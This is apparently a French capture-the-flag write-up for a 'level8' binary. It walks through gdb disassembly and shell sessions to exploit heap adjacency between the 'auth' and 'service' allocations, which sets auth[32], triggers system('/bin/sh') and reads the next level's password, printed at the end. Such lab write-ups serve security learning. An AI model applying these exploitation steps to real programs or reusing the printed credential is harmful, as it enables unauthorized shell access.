On a un programme, level8.
$ ./level8
(nil), (nil)

En analysant avec gdb, on voit qu'il contient un long main à déchiffrer. (cf Ressource/asm)
On voit tout de suite que le main comporte un appel system(/bin/sh).
Ce dernier n'est accessible qu'en rempliçant plusieurs conditions.

La condition directe pour l'appelle system est celui ci:
(gdb) disas main
    ...
   0x080486e2 <+382>:	mov    0x8049aac,%eax
   0x080486e7 <+387>:	mov    0x20(%eax),%eax
   0x080486ea <+390>:	test   %eax,%eax            <= test si eax = 0
   0x080486ec <+392>:	je     0x80486ff <main+411> <= si tel est le cas, on saute après l'appelle system system
   0x080486ee <+394>:	movl   $0x8048833,(%esp)
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   ...
(gdb) x/s 0x8049aac
    0x8049aac <auth>:	 "\b\240\004\b"
 il faut donc que eax soit différent de 0, et il semble que eax correspondent à 0x20 bytes après l'addresse 0x8049aac
 Cette addresse semble appartenir à une variable nommée auth. Il s'agit donc de auth + 32 bytes.
 On a donc notre objectif pour réussir à exploiter ce programme, faire en sorte que :
 auth + 32 != 0

 C'est parti on va donc commencer l'analyse du programme depuis le début.

 (gdb) disas main
    ...
    0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   ...
(gdb) x/s 0x8049ab0
    0x8049ab0 <service>:	 "\b\240\004\b"
(gdb) x/s 0x8049aac
    0x8049aac <auth>:	 "\b\240\004\b\b\240\004\b"
(gdb) x/s 0x8048810
    0x8048810:	 "%p, %p \n"
Le début de notre programme commence par un printf("%p, %p\n", auth, service)
Ce qui est bon signe puisque pour pouvoir écrire a auth + 32, il nous faut l'addresse de auth.

On continue d'analyser et on voit à plusieurs endroit des comparaison, dont le resultats va faire sauter des partis du code :

(gdb) disas main
    ...
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
    ...
   0x080485e0 <+124>:	test   %eax,%eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   ...
(gdb) x/s 0x8048819
    0x8048819:	 "auth "

Ici on compare le buffer (notre input) avec la string "auth "
 et plus loin, on voit que si cette comparaison n'est pas vérifier on saute une partie du code,
 qui comporte un malloc, que l'on attribue à la variable auth. on saute donc l'allocation de char *auth,
 ce qui explique pourquoi le programme affiche (nil, nil) au début: auth et service sont initialiser à null.
 En tapant donc "auth ", on pourrait permettre d'allouer une place mémoire pour auth, et donc d'obtenir son addresse dans la stack grace au printf.

 $ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)

Effectivement, ça fonctionne bien. Une fois qu'on a le début de auth, il suffit donc d'écrire 32 octets à cet endroit.
Mais en regardant la suite, on voit qu'il y a une protection.
En effet, une fois qu'on a écrit
(gdb) disas main
    ...
    0x0804861c <+184>:	repnz scas %es:(%edi),%al          => compte le nombre d'octet dans l'input (compte jusqu'à "\n")
   0x0804861e <+186>:	mov    %ecx,%eax
   0x08048620 <+188>:	not    %eax
   0x08048622 <+190>:	sub    $0x1,%eax
   0x08048625 <+193>:	cmp    $0x1e,%eax                   => compare le résultat avec 30
   0x08048628 <+196>:	ja     0x8048642 <main+222>         => si c'est supérieur, on saute a +222 (ne fera pas le strcpy)
   0x0804862a <+198>:	lea    0x20(%esp),%eax
   0x0804862e <+202>:	lea    0x5(%eax),%edx              => prend 5 octet après buffer
   0x08048631 <+205>:	mov    0x8049aac,%eax              => variable auth
   0x08048636 <+210>:	mov    %edx,0x4(%esp)              => buffer
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt> 
    ...
Non seulement si notre buffer compte plus de 30 octet, il ne sera pas copier dans auth, mais en plus le mot "auth " lui même ne sera pas copié dedans.
On ne pourra donc mettre qu'un maximum de 25 octets directement après notre auth. Il nous manqu donc 7 octets
On continue le décryptage du code:
De la même manière, on a par la suite une autre condition: si le buffer est égale à "reset", on free le auth.
 $ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    reset
    0x804a008, (nil)

Puis une autre conditions : si le buffer est egale à "servic", on duplique le buffer est on l'attribue à service, ce qui permettra d'initaliser service:
 $ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    reset
    0x804a008, (nil)
    service
    0x804a008, 0x804a008

Ok, ici on a donc notre addresse de auth qui est 0x804a008, ensuite le fait de le reset ça free le pointeur. On sait donc qu'il vaut mieux éviter de reset puisqu'on veut écrire dans auth[32].
Quand on a reset, on voit que l'attribution de service prend la même addresse. C'est normal, il prend la première place déjà disponible et fraichement libérée.

Puis on arrive à la derniere comparaison, on compare le buffer à login, si c'est égal à login,
il y a ensuite une condition, après le login, si auth[32] != 0 -> system(/bin/sh), else -> fwrite("password:\n", 1, 10)

$ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    reset
    0x804a008, (nil)
    service
    0x804a008, 0x804a008
    login
    Password:
    0x804a008, 0x804a008

Qu'en est-il si on ne free pas auth avant, quelle addresse service prendra ?

$ ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    service
    0x804a008, 0x804a018

Intéressant : 0x804a018 - 0x804a008 = 0x10 = 16 octets
C'est en fait logique puisqu'on précédement un malloc de 4, et que l'alocation minimale et de 16 octets (https://android.googlesource.com/platform/bionic/+/019d395/libc/upstream-dlmalloc/malloc.c)
Le pointeur de service est à mi-chemin entre auth et auth[32].
Et bonne nouvelle, il n'y a pas de vérification de la taille du buffer pour le dupliquer dans service.
On peux donc écrire encore 16 octets (ou plus) à la suite de service, pour que cela soit copier dans service et donc atteindre notre auth + 32 qui est en fait égale à service + 16.

$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA           
    0x804a008, 0x804a018 
    login
    $ /bin/cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
